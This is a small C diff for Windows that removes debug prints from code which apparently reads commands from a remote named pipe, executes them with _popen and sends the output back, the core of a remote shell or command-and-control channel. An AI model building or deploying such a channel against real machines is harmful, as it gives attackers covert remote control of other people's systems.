@@ -53,15 +53,12 @@ printf("Connecting to %s\n", RemoteNamedPipe);
 HANDLE hPipe = CreateFile(RemoteNamedPipe,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                           OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
 printf("0x%p\n",hPipe);
-printf("1 %d\n",GetLastError());
 ReadFile(hPipe,command,MAX_SIZE,&dRead,NULL);
-printf("2 %d\n",GetLastError());
 printf("%s\n",command);
 FILE *pPipe= _popen(command,"r");
 while(fgets(output,MAX_SIZE,pPipe)){
 puts(output);
 }
-printf("4 %d\n",GetLastError());
 printf("%s\n",output);
 WriteFile(hPipe,output,strlen(output),&dWritten,NULL);
 
